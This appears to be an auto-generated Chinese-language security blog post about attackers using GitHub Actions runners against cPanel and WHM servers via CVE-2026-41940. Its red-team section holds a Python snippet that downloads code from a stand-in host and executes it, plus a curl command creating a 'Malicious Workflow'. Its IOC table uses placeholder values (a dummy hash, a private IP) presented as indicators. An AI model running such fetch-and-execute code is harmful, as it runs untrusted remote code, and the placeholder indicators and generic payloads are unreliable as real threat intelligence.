---
layout: post
title:  "Attackers Weaponize GitHub Actions Runners to Target cPanel and WHM Servers"
date:   2026-07-23 13:39:53 +0000
categories: [security]
severity: critical
---

# 🚨 解析 GitHub Actions 被利用進行 cPanel 和 WHM 伺服器攻擊
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: 遠端命令執行 (RCE) 和資訊洩露
> * **關鍵技術**: GitHub Actions、cPanel 和 WHM 伺服器漏洞、CVE-2026-41940

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者利用 GitHub Actions 的功能，將惡意程式碼注入到受害者的 GitHub倉庫中，從而實現對 cPanel 和 WHM 伺服器的攻擊。
* **攻擊流程圖解**:
  1. 攻擊者將惡意程式碼注入到受害者的 GitHub倉庫中。
  2. GitHub Actions 啟動，下載惡意程式碼並執行。
  3. 惡意程式碼掃描 cPanel 和 WHM 伺服器，利用 CVE-2026-41940 漏洞進行攻擊。
* **受影響元件**: cPanel 和 WHM 伺服器，尤其是那些使用 GitHub Actions 的版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有受害者的 GitHub倉庫權限。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 下載惡意程式碼
    response = requests.get("https://example.com/malicious_code")
    
    # 執行惡意程式碼
    exec(response.text)
    
    ```
* **範例指令**:

    ```
    
    bash
    curl -X POST \
      https://api.github.com/repos/{owner}/{repo}/actions/workflows \
      -H 'Authorization: Bearer {token}' \
      -H 'Content-Type: application/json' \
      -d '{"name":"Malicious Workflow","on":{"push":{"branches":["main"]}},"jobs":{"build":{"runs-on":"ubuntu-latest","steps":[{"run":"echo \\"Malicious code executed\\""}]}}}'
    
    ```
* **繞過技術**: 攻擊者可以使用 GitHub Actions 的功能，將惡意程式碼注入到受害者的 GitHub倉庫中，從而繞過傳統的安全措施。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /malicious_code |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Malicious_GitHub_Actions {
      meta:
        description = "Detects malicious GitHub Actions"
      strings:
        $malicious_code = "echo \"Malicious code executed\""
      condition:
        $malicious_code
    }
    
    ```
* **緩解措施**: 更新 cPanel 和 WHM 伺服器至最新版本，關閉 GitHub Actions 的功能，監控 GitHub倉庫的變化。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **GitHub Actions**: 一種自動化工具，允許開發者在 GitHub 上自動執行任務。
* **cPanel 和 WHM 伺服器**: 一種網站管理平台，允許用戶管理網站和伺服器。
* **CVE-2026-41940**: 一種 cPanel 和 WHM 伺服器漏洞，允許攻擊者進行遠端命令執行和資訊洩露。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/07/attackers-weaponize-github-actions.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


